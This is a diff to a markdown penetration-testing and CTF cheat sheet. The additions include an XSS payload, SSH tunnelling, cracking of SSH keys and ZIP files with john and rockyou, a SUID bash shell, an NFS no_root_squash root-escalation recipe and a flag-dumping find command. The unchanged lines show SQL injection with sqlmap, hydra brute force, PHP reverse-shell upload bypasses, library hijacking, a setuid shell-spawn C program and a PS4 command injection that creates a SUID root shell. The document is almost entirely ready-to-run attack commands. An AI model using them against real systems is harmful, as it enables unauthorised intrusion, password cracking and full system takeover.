@@ -9,6 +9,7 @@
 * [XSS](#XSS)
 * [SQL Injection](#SQL-Injection)
 * [PHP Uploading Bypass](#PHP-Uploading-Bypass)
+* [Port Tunnelling](#Port-Tunnelling)
 * [HTTP](#HTTP)
 * [FTP](#FTP)
 * [SMB](#SMB)
@@ -41,8 +42,9 @@
 * [Directory Files Iteration](#Directory-Files-Iteration)
 * [Preload](#Preload)
 * [Library Hijack](#Library-Hijack)
-* [C Bash Spawn](#C-Bash-Spawn)
+* [C Shell Spawn](#C-Shell-Spawn)
 * [Abusing Shell](#Abusing-Shell)
+* [Dump Flags](#Dump-Flags)
 * [Metasploit](#Metasploit)
 
 
@@ -204,6 +206,7 @@ curl http://{TARGET}:{PORT}/{URI}
 ```
 <script>alert('XSS Works')</script>
 </p><script>console.log("XSS Works")</script><p>
+<img src=x onerror=alert('XSS Works')>
 ```
 
 ### Acquiring Cookies
@@ -246,6 +249,17 @@ sqlmap -r login.req -p u --batch -D {DB} -T {TABLE} -C {FIELD_1},{FIELD_2},{FIEL
 # .phtml
 
 mv reverse_shell.php reverse_shell.phtml
+```
+
+# Port Tunnelling
+
+### Using SSH
+
+```
+ssh -N -L {PORT}:127.0.0.1:{PORT} {USER}@{TARGET}
+
+# With Key
+ssh -N -L {PORT}:127.0.0.1:{PORT} -i {KEY} {USER}@{TARGET}
 ```
 
 
@@ -392,7 +406,7 @@ cat /etc/exports
 ### Mount
 
 ```
-sudo mount -t nfs {TARGET}:{MOUNT_POINT} {LOCAL_PATH}
+sudo mount -t nfs -o nolock {TARGET}:{MOUNT_POINT} {LOCAL_PATH}
 ```
 
 ### Umount
@@ -458,10 +472,17 @@ john --show {HASH_FILE}
 hydra -l {USER} -P /usr/share/wordlists/rockyou.txt ssh://{TARGET}
 ```
 
+### SSH Key
+
+```
+/usr/share/john/ssh2john.py {SSH_KEY_FILE} > {SSH_KEY_FILE}.john
+john --wordlist=/usr/share/wordlists/rockyou.txt {SSH_KEY_FILE}.john
+```
+
 ### ZIP
 
 ```
-zip2john {ZIP_FILE} > {ZIP_FILE}.hash
+/usr/share/john/zip2john {ZIP_FILE} > {ZIP_FILE}.hash
 john --wordlist='{WORDLIST_PATH}' {ZIP_FILE}.hash
 john --show {ZIP_FILE}.hash
 ```
@@ -517,6 +538,12 @@ hydra -l {USER} -P /usr/share/wordlists/rockyou.txt {TARGET} -f -t 32 mysql
 ```
 python -c 'import pty;pty.spawn("/bin/bash")'
 python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+### Bash
+
+```
+/suid/bash/binary -p
 ```
 
 # SUID
@@ -857,10 +884,10 @@ $ gcc -o /tmp/libcrypt.so.1 -shared -fPIC /absolute/path/library.c
 $ sudo LD_LIBRARY_PATH=/tmp apache2
 ```
 
-# C Bash Spawn
+# C Shell Spawn
 
 ```
-$ cat bash_spwan.c
+$ cat shell_spwan.c
 
 int main() {
 	setuid(0);
@@ -879,7 +906,7 @@ $ ls -lah /suid/binary
 $ strings /suid/binary
 service apache2 start
 
-$ gcc -o service /absolte/path/bash_spawn.c
+$ gcc -o service /absolte/path/shell_spawn.c
 $ PATH=.:$PATH /suid/binary
 ```
 
@@ -911,6 +938,29 @@ $ ls -lah /suid/binary
 
 $ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /suid/binary
 $ /tmp/rootbash -p
+```
+
+### 4)
+
+```
+# Remote target with "no_root_squash,insecure" NFS flags enabled
+# Remote target with /home/user mounted in host /tmp/mnt
+
+# Run in target
+$ cp /bin/bash /home/user/bash
+
+# Run in host
+$ sudo chown root:root /tmp/mnt/bash
+$ sudo chmod 4777 /tmp/mnt/bash
+
+# Run in target
+$ /home/user/bash -p
+```
+
+# Dump Flags
+
+```
+find / -type f -iname '*.flag' -exec echo{} \; -exec cat {} \; 2>/dev/null
 ```
 
 
